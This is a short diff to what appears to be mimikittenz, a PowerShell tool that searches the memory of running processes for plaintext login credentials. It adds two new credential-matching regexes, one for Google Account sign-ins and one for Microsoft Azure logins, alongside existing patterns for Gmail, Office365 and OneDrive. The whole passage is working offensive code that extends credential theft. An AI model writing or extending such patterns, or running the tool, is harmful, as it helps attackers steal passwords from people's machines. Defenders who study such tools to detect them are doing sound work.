@@ -452,7 +452,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
     #Gmail
     [mimikittenz.MemProcInspector]::AddRegex("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=")
-
+    [mimikittenz.MemProcInspector]::AddRegex("Google Account", "identifier=.{1,50}?&password=.{1,50}")
 
 #Web Services
 
@@ -462,6 +462,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #[mimikittenz.MemProcInspector]::AddRegex("SalesForce","&display=page&username=.{1,32}&pw=.{1,16}&Login=")
     #Office365
     [mimikittenz.MemProcInspector]::AddRegex("Office365","login=.{1,32}&passwd=.{1,22}&PPSX=")
+    [mimikittenz.MemProcInspector]::AddRegex("MicrosoftCloud - Azure","login=.{1,32}?passwd=.{1,22}")
     #Microsoft OneDrive
     [mimikittenz.MemProcInspector]::AddRegex("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=")
     #PayPal
